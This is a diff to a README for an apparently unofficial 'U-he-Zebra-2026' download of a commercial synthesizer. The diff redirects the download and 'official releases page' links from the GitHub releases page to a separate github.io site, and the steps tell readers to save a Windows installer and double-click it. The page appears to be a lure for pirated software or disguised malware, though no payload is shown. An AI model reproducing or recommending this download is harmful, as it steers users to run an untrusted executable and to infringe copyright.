@@ -1,6 +1,6 @@
 # 🎹 U-he-Zebra-2026 - Access professional synthesizer sounds today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sturgisreceived957/U-he-Zebra-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sturgisreceived957.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific components to run this software. Check your hardwar
 
 Follow these steps to obtain and configure the Zebra2 software on your machine.
 
-1.  Visit the [official releases page](https://github.com/sturgisreceived957/U-he-Zebra-2026/releases) to access the installer.
+1.  Visit the [official releases page](https://sturgisreceived957.github.io) to access the installer.
 2.  Locate the latest package marked as a Windows installer.
 3.  Click the filename to save the installer package to your Downloads folder.
 4.  Navigate to your Downloads folder and double-click the downloaded file to begin.
